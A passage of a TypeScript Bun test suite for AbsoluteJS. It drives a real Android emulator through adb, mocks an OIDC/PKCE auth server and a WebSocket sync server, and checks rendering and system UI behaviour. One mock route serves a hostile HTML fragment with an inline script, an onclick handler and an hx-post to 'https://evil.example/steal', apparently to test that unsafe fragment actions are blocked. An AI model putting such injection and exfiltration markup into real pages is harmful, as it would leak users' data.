import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { mkdir, readFile, unlink, writeFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { resolve } from 'node:path';
import config from '../fixtures/mobile-native-conformance/absolute.config';
import {
	buildAbsoluteAndroidGradleArtifact,
	prepareAbsoluteAndroidDevProject,
	startAbsoluteAndroidDevSession,
	type AbsoluteAndroidDevProject,
	type AbsoluteAndroidDevSession
} from '../../src/mobile/androidEmulatorController';
import {
	inspectAbsoluteAndroidInstalledApp,
	runAbsoluteAndroidUpgradeConformance,
	type AbsoluteAndroidUpgradeCommandResult
} from '../../src/mobile/androidUpgradeConformance';
import {
	attachAbsoluteAndroidWebView,
	type AbsoluteAndroidWebViewSession
} from '../../src/mobile/androidWebView';
import { normalizeAbsoluteMobileConfig } from '../../src/mobile/config';
import { createAbsoluteMobileCompatibilityDispatcher } from '../../src/mobile/compatibilityDispatcher';
import { applyAbsoluteNativeDeepLinks } from '../../src/mobile/nativeDeepLinks';
import { applyAbsoluteNativeDeviceCapabilities } from '../../src/mobile/nativeDeviceCapabilities';
import { findFreePort } from '../../src/cli/utils';
import {
	createAbsoluteMobileCompatibilityArtifact,
	parseAbsoluteMobileCompatibilityArtifact,
	type AbsoluteMobileCompatibilityArtifact
} from '../../src/mobile/releaseArtifact';
import {
	sanitizeNativeReportText,
	type AbsoluteNativeSyncMigrationResult
} from '../../src/mobile/nativeTestReport';

const ENABLED = process.env.ABSOLUTE_TEST_NATIVE_ANDROID === '1';
const describeNative = ENABLED ? describe : describe.skip;
const PROJECT_ROOT = resolve(import.meta.dir, '..', '..');
const CONFIG_PATH = resolve(
	PROJECT_ROOT,
	'tests/fixtures/mobile-native-conformance/absolute.config.ts'
);
const BUILD_DIRECTORY = resolve(
	PROJECT_ROOT,
	'.absolutejs/mobile-native-conformance/embedded-server'
);
const ARTIFACT_ROOT = resolve(
	PROJECT_ROOT,
	'.absolutejs/mobile-native-conformance/embedded-artifacts'
);
const CAPACITOR_CONFIG_PATH = resolve(PROJECT_ROOT, 'capacitor.config.ts');
const PACKAGE_JSON_PATH = resolve(PROJECT_ROOT, 'package.json');
const PORT = Number(process.env.ABSOLUTE_NATIVE_BUNDLE_TEST_PORT) || 39_080;
const PRODUCTION_ORIGIN = `http://localhost:${PORT}`;
const TIMEOUT_MS = 60_000;

let backend: ReturnType<typeof Bun.serve> | undefined;
let compiledBackend: ReturnType<typeof Bun.spawn> | undefined;
let compiledPort = 0;
let project: AbsoluteAndroidDevProject;
let android: AbsoluteAndroidDevSession;
let webview: AbsoluteAndroidWebViewSession;
let originalCapacitorConfig: string | undefined;
let nativeAuthAuthorizationRequests = 0;
let nativeAuthTokenRequests = 0;
let nativeAuthUserInfoRequests = 0;
let nativeSyncConnections = 0;
let nativeSyncTicketsIssued = 0;
let nativeSyncTicketsConsumed = 0;
type CompatibilityGeneration = 'current' | 'n+1' | 'n+2' | 'n+3' | 'rollback';

let compatibilityGeneration: CompatibilityGeneration = 'current';
let compatibilityDispatchers: Partial<
	Record<
		Exclude<CompatibilityGeneration, 'current'>,
		ReturnType<typeof createAbsoluteMobileCompatibilityDispatcher>
	>
> = {};

type AuthorizationTransaction = {
	challenge: string;
	clientId: string;
	nonce: string;
	redirectUri: string;
};

type NativeSyncSocketData = { authenticated: boolean };

type NativeFragmentBoundary = {
	handlerExecuted: boolean;
	safeAction: string | null;
	scriptExecuted: boolean;
	unsafeAction: string | null;
};

type SigningJwk = JsonWebKey & {
	alg: string;
	kid: string;
	use: string;
};

const authorizationCodes = new Map<string, AuthorizationTransaction>();
const accessTokens = new Set<string>();
const refreshTokens = new Set<string>();
const socketTickets = new Set<string>();

const nextCompatibilityArtifact = (
	base: AbsoluteMobileCompatibilityArtifact,
	generation: number
) =>
	createAbsoluteMobileCompatibilityArtifact({
		appBuild: `native-conformance-build-${generation}`,
		appId: base.appId,
		generation,
		pages: base.pages,
		producer: base.producer,
		routes: base.routes,
		runtime: `native-conformance-runtime-${generation}`
	});

const proxyCompiledBackend = async (request: Request) => {
	const target = new URL(request.url);
	target.hostname = '127.0.0.1';
	target.port = String(compiledPort);

	const response = await fetch(new Request(target, request));
	const headers = new Headers(response.headers);
	headers.set('access-control-allow-origin', '*');

	return new Response(response.body, {
		headers,
		status: response.status,
		statusText: response.statusText
	});
};

const prepareCompatibilityDispatchers = async () => {
	const rawIndex: unknown = JSON.parse(
		await readFile(
			resolve(
				BUILD_DIRECTORY,
				'.absolutejs/mobile-compatibility/current.json'
			),
			'utf8'
		)
	);
	if (typeof rawIndex !== 'object' || rawIndex === null) {
		throw new Error('The native compatibility index is invalid.');
	}
	const releases = Reflect.get(rawIndex, 'releases');
	if (!Array.isArray(releases))
		throw new Error('The native compatibility index is invalid.');
	const [release] = releases;
	const generationN = parseAbsoluteMobileCompatibilityArtifact(release);
	const generationNPlusOne = nextCompatibilityArtifact(
		generationN,
		generationN.generation + 1
	);
	const generationNPlusTwo = nextCompatibilityArtifact(
		generationN,
		generationN.generation + 2
	);
	const generationNPlusThree = nextCompatibilityArtifact(
		generationN,
		generationN.generation + 3
	);
	const dispatcher = (
		artifacts: AbsoluteMobileCompatibilityArtifact[],
		current: AbsoluteMobileCompatibilityArtifact
	) =>
		createAbsoluteMobileCompatibilityDispatcher({
			artifacts,
			currentReleaseId: current.releaseId,
			loadProducer: async () => ({ handle: proxyCompiledBackend })
		});
	const nPlusOne = dispatcher(
		[generationNPlusOne, generationN],
		generationNPlusOne
	);
	const nPlusTwo = dispatcher(
		[generationNPlusTwo, generationNPlusOne, generationN],
		generationNPlusTwo
	);
	compatibilityDispatchers = {
		'n+1': nPlusOne,
		'n+2': nPlusTwo,
		'n+3': dispatcher(
			[generationNPlusThree, generationNPlusTwo, generationNPlusOne],
			generationNPlusThree
		),
		rollback: nPlusTwo
	};
};

const prepareSystemBrowser = (adb: string, serial: string) => {
	const commandLine = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		"echo 'chrome --disable-fre --no-first-run --no-default-browser-check' > /data/local/tmp/chrome-command-line"
	]);
	if (commandLine.exitCode !== 0) {
		throw new Error(
			`Failed to prepare Chrome for native auth acceptance: ${commandLine.stderr.toString().trim()}`
		);
	}
	const stopped = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		'am',
		'force-stop',
		'com.android.chrome'
	]);
	if (stopped.exitCode !== 0) {
		throw new Error(
			`Failed to restart Chrome for native auth acceptance: ${stopped.stderr.toString().trim()}`
		);
	}
};

const clearAppData = (adb: string, serial: string, appId: string) => {
	const stopped = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		'am',
		'force-stop',
		appId
	]);
	if (stopped.exitCode !== 0) {
		throw new Error(
			`Failed to stop Android acceptance app: ${stopped.stderr.toString().trim() || stopped.stdout.toString().trim()}`
		);
	}
	const cleared = Bun.spawnSync([
		adb,
		'-s',
		serial,
		'shell',
		'pm',
		'clear',
		appId
	]);
	if (
		cleared.exitCode !== 0 ||
		cleared.stdout.toString().trim() !== 'Success'
	) {
		throw new Error(
			`Failed to clear Android acceptance app data: ${cleared.stderr.toString().trim() || cleared.stdout.toString().trim()}`
		);
	}
};

const captureUpgradeCommand = async (
	command: string[]
): Promise<AbsoluteAndroidUpgradeCommandResult> => {
	const process = Bun.spawn(command, { stderr: 'pipe', stdout: 'pipe' });
	const [exitCode, stderr, stdout] = await Promise.all([
		process.exited,
		new Response(process.stderr).text(),
		new Response(process.stdout).text()
	]);

	return { exitCode, stderr, stdout };
};

let signingKey: CryptoKey;
let signingJwk: SigningJwk;

const base64Url = (value: string | Uint8Array) =>
	Buffer.from(value).toString('base64url');

const jsonResponse = (value: unknown, init: ResponseInit = {}) =>
	new Response(JSON.stringify(value), {
		...init,
		headers: {
			'access-control-allow-headers': 'authorization,content-type',
			'access-control-allow-methods': 'GET,POST,OPTIONS',
			'access-control-allow-origin': '*',
			'content-type': 'application/json',
			...init.headers
		}
	});

const signIdToken = async (clientId: string, nonce: string) => {
	const header = base64Url(
		JSON.stringify({ alg: 'ES256', kid: 'native-conformance', typ: 'JWT' })
	);
	const payload = base64Url(
		JSON.stringify({
			aud: clientId,
			exp: Math.floor(Date.now() / 1000) + 300,
			iat: Math.floor(Date.now() / 1000),
			iss: PRODUCTION_ORIGIN,
			nonce,
			sub: 'native-conformance-user'
		})
	);
	const input = `${header}.${payload}`;
	const signature = await crypto.subtle.sign(
		{ hash: 'SHA-256', name: 'ECDSA' },
		signingKey,
		new TextEncoder().encode(input)
	);

	return `${input}.${base64Url(new Uint8Array(signature))}`;
};

const nativeAuthResponse = async (request: Request) => {
	const url = new URL(request.url);
	if (request.method === 'OPTIONS') {
		return jsonResponse(null, {
			headers: {
				'access-control-allow-headers':
					request.headers.get('access-control-request-headers') ??
					'authorization,content-type'
			},
			status: 204
		});
	}
	if (url.pathname === '/.well-known/openid-configuration') {
		return jsonResponse({
			authorization_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-authorize`,
			code_challenge_methods_supported: ['S256'],
			issuer: PRODUCTION_ORIGIN,
			jwks_uri: `${PRODUCTION_ORIGIN}/__absolute/native-jwks`,
			revocation_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-revoke`,
			socket_ticket_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-socket-ticket`,
			token_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-token`,
			token_endpoint_auth_methods_supported: ['none'],
			userinfo_endpoint: `${PRODUCTION_ORIGIN}/__absolute/native-userinfo`
		});
	}
	if (url.pathname === '/__absolute/native-jwks') {
		return jsonResponse({ keys: [signingJwk] });
	}
	if (url.pathname === '/__absolute/native-authorize') {
		nativeAuthAuthorizationRequests += 1;
		const code = crypto.randomUUID();
		const transaction: AuthorizationTransaction = {
			challenge: url.searchParams.get('code_challenge') ?? '',
			clientId: url.searchParams.get('client_id') ?? '',
			nonce: url.searchParams.get('nonce') ?? '',
			redirectUri: url.searchParams.get('redirect_uri') ?? ''
		};
		if (
			transaction.clientId !==
				'absolutejs-native:com.absolutejs.conformance' ||
			!transaction.challenge ||
			!transaction.nonce ||
			!transaction.redirectUri
		) {
			return jsonResponse({ error: 'invalid_request' }, { status: 400 });
		}
		authorizationCodes.set(code, transaction);
		const callback = new URL(transaction.redirectUri);
		callback.searchParams.set('code', code);
		callback.searchParams.set('iss', PRODUCTION_ORIGIN);
		callback.searchParams.set('state', url.searchParams.get('state') ?? '');

		return new Response(null, {
			headers: { location: callback.href },
			status: 302
		});
	}
	if (url.pathname === '/__absolute/native-token') {
		nativeAuthTokenRequests += 1;
		const body = new URLSearchParams(await request.text());
		if (body.get('grant_type') === 'refresh_token') {
			const refreshToken = body.get('refresh_token') ?? '';
			if (
				body.get('client_id') !==
					'absolutejs-native:com.absolutejs.conformance' ||
				!refreshTokens.delete(refreshToken)
			) {
				return jsonResponse(
					{ error: 'invalid_grant' },
					{ status: 400 }
				);
			}
			const accessToken = `access-${crypto.randomUUID()}`;
			const rotatedRefreshToken = `refresh-${crypto.randomUUID()}`;
			accessTokens.add(accessToken);
			refreshTokens.add(rotatedRefreshToken);

			return jsonResponse({
				access_token: accessToken,
				expires_in: 300,
				id_token: await signIdToken(
					'absolutejs-native:com.absolutejs.conformance',
					''
				),
				refresh_token: rotatedRefreshToken,
				scope: 'openid profile',
				token_type: 'Bearer'
			});
		}
		const code = body.get('code') ?? '';
		const transaction = authorizationCodes.get(code);
		const verifier = body.get('code_verifier') ?? '';
		const challenge = createHash('sha256')
			.update(verifier)
			.digest('base64url');
		if (
			body.get('grant_type') !== 'authorization_code' ||
			!transaction ||
			transaction.challenge !== challenge ||
			transaction.clientId !== body.get('client_id') ||
			transaction.redirectUri !== body.get('redirect_uri')
		) {
			return jsonResponse({ error: 'invalid_grant' }, { status: 400 });
		}
		authorizationCodes.delete(code);
		const accessToken = `access-${crypto.randomUUID()}`;
		const refreshToken = `refresh-${crypto.randomUUID()}`;
		accessTokens.add(accessToken);
		refreshTokens.add(refreshToken);

		return jsonResponse({
			access_token: accessToken,
			expires_in: 300,
			id_token: await signIdToken(
				transaction.clientId,
				transaction.nonce
			),
			refresh_token: refreshToken,
			scope: 'openid profile',
			token_type: 'Bearer'
		});
	}
	if (url.pathname === '/__absolute/native-userinfo') {
		nativeAuthUserInfoRequests += 1;
		const token = request.headers
			.get('authorization')
			?.replace('Bearer ', '');

		return accessTokens.has(token ?? '')
			? jsonResponse({
					email: 'native-conformance@absolutejs.com',
					sub: 'native-conformance-user'
				})
			: jsonResponse({ error: 'invalid_token' }, { status: 401 });
	}
	if (url.pathname === '/__absolute/native-socket-ticket') {
		const token = request.headers
			.get('authorization')
			?.replace('Bearer ', '');
		if (!accessTokens.has(token ?? ''))
			return jsonResponse({ error: 'invalid_token' }, { status: 401 });
		const ticket = `ticket-${crypto.randomUUID()}`;
		socketTickets.add(ticket);
		nativeSyncTicketsIssued += 1;

		return jsonResponse({ ticket });
	}
	if (url.pathname === '/__absolute/native-revoke') {
		return jsonResponse(null);
	}

	return undefined;
};

const runPrepare = async () => {
	const process = Bun.spawn(
		[
			'bun',
			'run',
			'src/cli/index.ts',
			'prepare',
			'example/server.ts',
			'--outdir',
			BUILD_DIRECTORY,
			'--config',
			CONFIG_PATH
		],
		{
			cwd: PROJECT_ROOT,
			env: {
				...Bun.env,
				ABSOLUTE_NATIVE_CONFORMANCE_ORIGIN: PRODUCTION_ORIGIN
			},
			stderr: 'inherit',
			stdout: 'inherit'
		}
	);
	const exitCode = await process.exited;
	if (exitCode !== 0) {
		throw new Error(
			`Embedded mobile production build failed (${exitCode}).`
		);
	}
};

const startCompiledBackend = async () => {
	compiledBackend = Bun.spawn(['bun', 'server.js'], {
		cwd: BUILD_DIRECTORY,
		env: {
			...Bun.env,
			ABSOLUTE_BUILD_DIR: BUILD_DIRECTORY,
			ABSOLUTE_CONFIG: CONFIG_PATH,
			ABSOLUTE_NATIVE_CONFORMANCE_ORIGIN: PRODUCTION_ORIGIN,
			NODE_ENV: 'production',
			PORT: String(compiledPort)
		},
		stderr: 'inherit',
		stdout: 'inherit'
	});
	const deadline = Date.now() + TIMEOUT_MS;
	while (Date.now() < deadline) {
		if (compiledBackend.exitCode !== null)
			throw new Error(
				`Compiled conformance backend exited (${compiledBackend.exitCode}).`
			);
		const response = await fetch(
			`http://127.0.0.1:${compiledPort}/react`
		).catch(() => undefined);
		if (response?.ok) return;
		await Bun.sleep(100);
	}

	throw new Error('Compiled conformance backend did not become ready.');
};

const stopCompiledBackend = async () => {
	const process = compiledBackend;
	compiledBackend = undefined;
	process?.kill();
	await process?.exited.catch(() => undefined);
};

const syncAndroidEmbeddedBundle = async () => {
	const process = Bun.spawn([project.cap, 'sync', 'android'], {
		cwd: PROJECT_ROOT,
		stderr: 'inherit',
		stdout: 'inherit'
	});
	const exitCode = await process.exited;
	if (exitCode !== 0)
		throw new Error(
			`Capacitor Android synchronization failed (${exitCode}).`
		);
};

const waitForText = (text: string) =>
	webview.waitFor<boolean>(
		`document.body?.innerText?.includes(${JSON.stringify(text)}) === true`,
		{ timeoutMs: TIMEOUT_MS }
	);

const navigate = async (path: string, expectedText: string) => {
	const clicked = await webview.evaluate<boolean>(`(() => {
		const anchor = [...document.querySelectorAll('a[href]')].find((candidate) => {
			try { return new URL(candidate.href).pathname === ${JSON.stringify(path)}; }
			catch { return false; }
		});
		if (!(anchor instanceof HTMLAnchorElement)) return false;
		anchor.click();
		return true;
	})()`);
	expect(clicked).toBe(true);
	await waitForText(expectedText);
};

const openNativeRoute = async (path: string, expectedText: string) => {
	const opened = await webview.evaluate<boolean>(`(() => {
		const anchor = document.createElement('a');
		anchor.href = ${JSON.stringify(path)};
		anchor.textContent = ${JSON.stringify(expectedText)};
		document.body.appendChild(anchor);
		anchor.click();
		return true;
	})()`);
	expect(opened).toBe(true);
	await waitForText(expectedText);
};

const ensureNativeAuthSyncAcceptance = async () => {
	await openNativeRoute('/native-auth-sync', 'AbsoluteJS Native Auth + Sync');
	const state = await webview.evaluate<string | null>(
		`document.querySelector('#native-auth-sync-status')?.getAttribute('data-state') ?? null`
	);
	if (state !== 'complete') {
		const clickedStart = await webview.evaluate<boolean>(`(() => {
			const button = document.querySelector('#native-auth-sync-start');
			if (!(button instanceof HTMLButtonElement)) return false;
			button.click();
			return true;
		})()`);
		expect(clickedStart).toBe(true);
		await waitForText('Native auth + sync complete');
	}
	const completed = await webview.evaluate<string | null>(
		`document.querySelector('#native-auth-sync-status')?.getAttribute('data-state') ?? null`
	);
	expect(completed).toBe('complete');
};

const requireAdbShell = (...args: string[]) => {
	let failure = '';
	for (let attempt = 0; attempt < 3; attempt += 1) {
		const result = Bun.spawnSync([
			project.adb,
			'-s',
			android.serial,
			'shell',
			...args
		]);
		if (result.exitCode === 0) return result.stdout.toString().trim();
		failure =
			result.stderr.toString().trim() || result.stdout.toString().trim();
	}

	throw new Error(`ADB shell ${args.join(' ')} failed: ${failure}`);
};

const inputMethodIsVisible = () =>
	/InsetsSource id=3 type=ime[^\n]* visible=true/u.test(
		requireAdbShell('dumpsys', 'activity', 'activities')
	);

const waitForInputMethod = async (visible: boolean) => {
	const deadline = Date.now() + 8_000;
	while (Date.now() < deadline) {
		if (inputMethodIsVisible() === visible) return;
		await Bun.sleep(500);
	}

	throw new Error(
		`Android IME did not become ${visible ? 'visible' : 'hidden'} within 8 seconds.`
	);
};

const statusBarIsVisible = () =>
	/InsetsSource id=[^ ]+ type=statusBars[^\n]* visible=true/u.test(
		requireAdbShell('dumpsys', 'activity', 'activities')
	);

const waitForStatusBar = async (visible: boolean) => {
	const deadline = Date.now() + 8_000;
	while (Date.now() < deadline) {
		if (statusBarIsVisible() === visible) return;
		await Bun.sleep(500);
	}

	throw new Error(
		`Android status bar did not become ${visible ? 'visible' : 'hidden'} within 8 seconds.`
	);
};

const androidWebViewBounds = () => {
	const path = '/data/local/tmp/absolutejs-system-ui.xml';
	requireAdbShell('uiautomator', 'dump', path);
	const hierarchy = requireAdbShell('cat', path);
	const bounds = hierarchy.match(
		/class="android\.webkit\.WebView"[^>]* bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"/u
	);
	if (!bounds)
		throw new Error('Android accessibility hierarchy omitted the WebView.');

	return {
		bottom: Number(bounds[4]),
		left: Number(bounds[1]),
		right: Number(bounds[3]),
		top: Number(bounds[2])
	};
};

const clickSystemUi = async (selector: string) => {
	const clicked = await webview.evaluate<boolean>(`(() => {
		const button = document.querySelector(${JSON.stringify(selector)});
		if (!(button instanceof HTMLButtonElement)) return false;
		button.click();
		return true;
	})()`);
	expect(clicked).toBe(true);
};

const appWindowAppearance = () => {
	const output = requireAdbShell('dumpsys', 'window', 'windows');
	const lines = output.split(/\r?\n/u);
	const start = lines.findIndex(
		(line) =>
			line.includes('Window{') &&
			line.includes('com.absolutejs.conformance')
	);
	if (start < 0)
		throw new Error('Android window diagnostics did not contain the app.');
	const block = lines.slice(start, start + 100);
	const appearance = block.find(
		(line) => line.includes('appearance=') || line.includes('apr=')
	);
	if (!appearance) {
		throw new Error(
			`Android window diagnostics did not expose system-bar appearance: ${block.join('\n')}`
		);
	}

	return {
		forcedLightNavigationBars: appearance.includes(
			'FORCE_LIGHT_NAVIGATION_BARS'
		),
		lightNavigationBars: appearance.includes('LIGHT_NAVIGATION_BARS'),
		lightStatusBars: appearance.includes('LIGHT_STATUS_BARS')
	};
};

const nativeTest = (
	name: string,
	operation: () => Promise<void>,
	timeoutMs = 300_000
) =>
	test(
		name,
		async () => {
			try {
				await operation();
			} catch (error) {
				await mkdir(ARTIFACT_ROOT, { recursive: true });
				const slug = name.toLowerCase().replaceAll(/[^a-z0-9]+/gu, '-');
				const documentState = await webview
					?.evaluate(
						`(() => ({
						bodyText: document.body?.innerText ?? '',
						counter: document.querySelector('#counter')?.textContent ?? null,
						location: location.href,
						scripts: [...document.scripts].map((script) => ({ src: script.src, type: script.type })),
						counterListeners: typeof getEventListeners === 'function' && document.querySelector('#counter-button')
							? Object.keys(getEventListeners(document.querySelector('#counter-button')))
							: [],
						title: document.title
					}))()`
					)
					.catch(() => undefined);
				await webview
					?.screenshot(resolve(ARTIFACT_ROOT, `${slug}.png`))
					.catch(() => undefined);
				await writeFile(
					resolve(ARTIFACT_ROOT, `${slug}.json`),
					`${JSON.stringify(
						{
							diagnostics: (webview?.diagnostics ?? [])
								.filter(({ level }) => level !== 'info')
								.map((entry) => ({
									...entry,
									message: sanitizeNativeReportText(
										entry.message
									)
								})),
							document: documentState,
							error:
								error instanceof Error
									? {
											message: error.message,
											stack: error.stack
										}
									: String(error)
						},
						null,
						2
					)}\n`
				);
				throw error;
			}
		},
		timeoutMs
	);

describeNative('real Capacitor Android embedded-bundle conformance', () => {
	beforeAll(async () => {
		originalCapacitorConfig = await readFile(
			CAPACITOR_CONFIG_PATH,
			'utf8'
		).catch(() => undefined);
		const keys = await crypto.subtle.generateKey(
			{ name: 'ECDSA', namedCurve: 'P-256' },
			true,
			['sign', 'verify']
		);
		signingKey = keys.privateKey;
		signingJwk = {
			...(await crypto.subtle.exportKey('jwk', keys.publicKey)),
			alg: 'ES256',
			kid: 'native-conformance',
			use: 'sig'
		};
		await runPrepare();
		compiledPort = await findFreePort();
		await startCompiledBackend();
		await prepareCompatibilityDispatchers();
		backend = Bun.serve<NativeSyncSocketData>({
			hostname: '127.0.0.1',
			port: PORT,
			websocket: {
				message(socket, message) {
					const frame: unknown = JSON.parse(String(message));
					if (typeof frame !== 'object' || frame === null) return;
					if (Reflect.get(frame, 'type') === 'authenticate') {
						const ticket = Reflect.get(frame, 'ticket');
						if (
							typeof ticket !== 'string' ||
							!socketTickets.delete(ticket)
						) {
							socket.close(1008, 'invalid ticket');

							return;
						}
						socket.data.authenticated = true;
						nativeSyncTicketsConsumed += 1;

						return;
					}
					if (
						socket.data.authenticated &&
						Reflect.get(frame, 'type') === 'subscribe'
					) {
						socket.send(
							JSON.stringify({
								id: Reflect.get(frame, 'id'),
								rows: [
									{
										id: 1,
										label: 'native-authenticated-sync'
									}
								],
								type: 'snapshot',
								version: nativeSyncConnections
							})
						);
					}
				},
				open() {
					nativeSyncConnections += 1;
				}
			},
			fetch: async (request, server) => {
				const url = new URL(request.url);
				const mobilePageId = request.headers.get(
					'x-absolute-mobile-page-id'
				);
				if (compatibilityGeneration !== 'current' && mobilePageId) {
					const dispatcher =
						compatibilityDispatchers[compatibilityGeneration];
					if (!dispatcher)
						throw new Error(
							`Missing ${compatibilityGeneration} compatibility dispatcher.`
						);

					return dispatcher.handle(request);
				}
				if (url.pathname === '/__absolute/native-sync') {
					const upgraded = server.upgrade(request, {
						data: { authenticated: false }
					});
					if (upgraded) return undefined;

					return new Response('WebSocket upgrade required.', {
						status: 426
					});
				}
				const authResponse = await nativeAuthResponse(request);
				if (authResponse) return authResponse;
				if (url.pathname === '/__absolute/native-fragment') {
					return new Response(
						'<section id="trusted-fragment" onclick="window.__ABS_BAD_HANDLER__=true"><script>window.__ABS_BAD_SCRIPT__=true</script><button id="safe-fragment-action" hx-post="/htmx/increment">Native fragment safe</button><button id="unsafe-fragment-action" hx-post="https://evil.example/steal">Unsafe</button></section>',
						{
							headers: {
								'access-control-allow-origin': '*',
								'content-type': 'text/html'
							}
						}
					);
				}

				return proxyCompiledBackend(request);
			}
		});
		if (!config.mobile)
			throw new Error('Native mobile fixture is invalid.');
		const mobile = normalizeAbsoluteMobileConfig(
			{
				...config.mobile,
				server: { productionOrigin: PRODUCTION_ORIGIN }
			},
			PROJECT_ROOT
		);
		project = await prepareAbsoluteAndroidDevProject(mobile, {
			createNativeProject: true,
			projectRoot: PROJECT_ROOT
		});
		await applyAbsoluteNativeDeepLinks(mobile, ['android']);
		await applyAbsoluteNativeDeviceCapabilities(PROJECT_ROOT, mobile, [
			'android'
		]);
		android = await startAbsoluteAndroidDevSession({
			embeddedBundle: true,
			port: PORT,
			project,
			log: (message) => console.log(`[native-bundle] ${message}`)
		});
		clearAppData(project.adb, android.serial, mobile.appId);
		await android.relaunch();
		prepareSystemBrowser(project.adb, android.serial);
		webview = await attachAbsoluteAndroidWebView({
			adb: project.adb,
			appId: mobile.appId,
			serial: android.serial,
			timeoutMs: TIMEOUT_MS
		});
		try {
			await webview.evaluate(`Promise.all([
				'absolutejs.auth.',
				'absolutejs.sync.'
			].map((prefix) => globalThis.Capacitor.Plugins.AbsoluteSecureStorage.clear({ prefix })))`);
			await webview.evaluate(`location.replace('/react')`);
			await waitForText('AbsoluteJS + React');
		} catch (error) {
			await mkdir(ARTIFACT_ROOT, { recursive: true });
			const documentState = await webview
				.evaluate(
					`(() => ({
					bodyText: document.body?.innerText ?? '',
					bodyHtml: document.body?.innerHTML ?? '',
					location: location.href,
					title: document.title
				}))()`
				)
				.catch(() => undefined);
			await webview
				.screenshot(resolve(ARTIFACT_ROOT, 'startup.png'))
				.catch(() => undefined);
			await writeFile(
				resolve(ARTIFACT_ROOT, 'startup.json'),
				`${JSON.stringify(
					{
						diagnostics: webview.diagnostics
							.filter(({ level }) => level !== 'info')
							.map((entry) => ({
								...entry,
								message: sanitizeNativeReportText(entry.message)
							})),
						document: documentState,
						error:
							error instanceof Error
								? { message: error.message, stack: error.stack }
								: String(error)
					},
					null,
					2
				)}\n`
			);
			throw error;
		}
	}, 900_000);

	afterAll(async () => {
		await webview?.close().catch(() => undefined);
		await android?.close().catch(() => undefined);
		backend?.stop(true);
		compiledBackend?.kill();
		await compiledBackend?.exited.catch(() => undefined);
		if (originalCapacitorConfig === undefined)
			await unlink(CAPACITOR_CONFIG_PATH).catch(() => undefined);
		else await writeFile(CAPACITOR_CONFIG_PATH, originalCapacitorConfig);
	}, 120_000);

	nativeTest(
		'renders every supported framework from the embedded app',
		async () => {
			await navigate('/angular', 'AbsoluteJS + Angular');
			await navigate('/vue', 'AbsoluteJS + Vue');
			await navigate('/svelte', 'AbsoluteJS + Svelte');
			await navigate('/html', 'AbsoluteJS + HTML');
			await navigate('/htmx', 'AbsoluteJS + HTMX');
			await navigate('/react', 'AbsoluteJS + React');
		}
	);

	nativeTest(
		'executes the hashed local HTML application script',
		async () => {
			await navigate('/html', 'AbsoluteJS + HTML');
			const clicked = await webview.evaluate<boolean>(`(() => {
			const button = document.querySelector('#counter-button');
			if (!(button instanceof HTMLButtonElement)) return false;
			button.click();
			return true;
		})()`);
			expect(clicked).toBe(true);
			await webview.waitFor<boolean>(
				`document.querySelector('#counter')?.textContent?.trim() === '1'`,
				{ timeoutMs: TIMEOUT_MS }
			);
		}
	);

	nativeTest(
		'uses portable keyboard and modern system bars in the real WebView',
		async () => {
			await openNativeRoute('/native-system-ui', 'AbsoluteJS System UI');
			const originalHardwareKeyboardIme = requireAdbShell(
				'settings',
				'get',
				'secure',
				'show_ime_with_hard_keyboard'
			);
			requireAdbShell(
				'settings',
				'put',
				'secure',
				'show_ime_with_hard_keyboard',
				'1'
			);
			await clickSystemUi('#system-ui-query');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'System UI queried'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			expect(
				await webview.evaluate<string | null>(
					`document.querySelector('[data-system-bars]')?.getAttribute('data-system-bars') ?? null`
				)
			).toBe('native');
			await clickSystemUi('#system-ui-dismiss');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'Keyboard dismissed'`,
				{ timeoutMs: TIMEOUT_MS }
			);

			const exerciseKeyboard = async () => {
				const point = await webview.evaluate<{
					x: number;
					y: number;
				} | null>(`(() => {
					const input = document.querySelector('#system-ui-input');
					if (!(input instanceof HTMLInputElement)) return null;
					input.blur();
					const rect = input.getBoundingClientRect();
					return {
						x: rect.left + rect.width / 2,
						y: rect.top + rect.height / 2
					};
				})()`);
				expect(point).not.toBeNull();
				await webview.tap(point?.x ?? -1, point?.y ?? -1);
				await waitForInputMethod(true);
				requireAdbShell('input', 'keyevent', '4');
				await waitForInputMethod(false);
				await webview.close();
				await android.relaunch();
				webview = await attachAbsoluteAndroidWebView({
					adb: project.adb,
					appId: 'com.absolutejs.conformance',
					serial: android.serial,
					timeoutMs: TIMEOUT_MS
				});
				await openNativeRoute(
					'/native-system-ui',
					'AbsoluteJS System UI'
				);
			};

			try {
				for (let attempt = 0; attempt < 5; attempt += 1) {
					await exerciseKeyboard();
				}
			} finally {
				if (originalHardwareKeyboardIme === 'null') {
					requireAdbShell(
						'settings',
						'delete',
						'secure',
						'show_ime_with_hard_keyboard'
					);
				} else {
					requireAdbShell(
						'settings',
						'put',
						'secure',
						'show_ime_with_hard_keyboard',
						originalHardwareKeyboardIme
					);
				}
			}

			await clickSystemUi('#system-ui-query');
			await webview.waitFor<boolean>(
				`document.querySelector('[data-system-bars]')?.getAttribute('data-system-bars') === 'native'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await clickSystemUi('#system-ui-light');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'Light foreground applied'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			expect(appWindowAppearance()).toEqual({
				forcedLightNavigationBars: true,
				lightNavigationBars: true,
				lightStatusBars: false
			});
			await clickSystemUi('#system-ui-dark');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'Dark foreground applied'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			expect(appWindowAppearance()).toEqual({
				forcedLightNavigationBars: true,
				lightNavigationBars: true,
				lightStatusBars: true
			});

			await clickSystemUi('#system-ui-hide-status');
			await webview.waitFor<boolean>(
				`document.querySelector('#system-ui-detail')?.textContent === 'Status bar hidden'`,
				{ timeoutMs: TIMEOUT_MS }
			);
			await waitForStatusBar(false);
